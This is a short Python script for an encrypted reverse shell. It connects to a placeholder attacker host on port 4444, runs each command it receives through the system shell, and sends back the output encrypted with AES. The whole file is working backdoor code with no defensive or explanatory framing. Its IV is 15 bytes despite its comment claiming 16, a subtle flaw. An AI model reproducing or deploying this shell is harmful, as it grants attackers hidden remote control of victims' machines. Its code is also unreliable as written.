import socket
import subprocess
import os
import base64
from Crypto.Cipher import AES
import hashlib

# AES Key setup
KEY = hashlib.sha256(b"your_secret_key").digest()
IV = b"16byteslongiv__"  # 16-byte IV

def encrypt(data):
    """Encrypt data before sending."""
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    data = data + b" " * (16 - len(data) % 16)  # Padding
    return base64.b64encode(cipher.encrypt(data))

def decrypt(data):
    """Decrypt received data."""
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return cipher.decrypt(base64.b64decode(data)).strip()

def connect():
    """Connects to attacker's server and waits for commands."""
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(("attacker-ip", 4444))

    while True:
        command = decrypt(client.recv(1024))
        if command == b"exit":
            break
        
        output = subprocess.run(command.decode(), shell=True, capture_output=True)
        client.send(encrypt(output.stdout + output.stderr))

    client.close()

if __name__ == "__main__":
    connect()
